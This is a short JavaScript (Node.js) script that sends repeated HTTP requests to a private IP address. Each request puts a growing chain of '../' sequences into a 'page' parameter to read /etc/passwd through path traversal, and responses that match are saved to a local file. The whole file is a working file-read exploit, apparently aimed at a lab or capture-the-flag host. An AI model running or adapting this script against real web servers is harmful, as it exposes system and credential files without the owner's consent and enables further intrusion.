const axios = require('axios')
const fs = require('fs')

let i = 0;
let data = ''
while (i < 30)
{
    data += '../'
    axios.get(`http://10.12.100.89/?page=${data}etc/passwd`).then(res => {
        if (res.data.indexOf('The') != -1)
            fs.writeFileSync('./path.txt', res.data)
    })
    i++;
}